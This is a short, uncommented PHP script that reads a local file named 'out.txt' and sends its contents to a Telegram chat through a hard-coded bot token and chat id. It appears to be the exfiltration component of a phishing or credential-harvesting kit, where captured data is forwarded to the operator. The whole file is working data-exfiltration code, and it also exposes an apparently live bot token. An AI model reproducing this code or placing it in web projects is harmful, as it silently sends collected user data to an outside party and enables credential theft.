<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1958882799:AAEMgT65wlKQVlftwkdTfIIpdNxEk2P8j2g/sendMessage?chat_id=1863870362&text=$msg");
?>
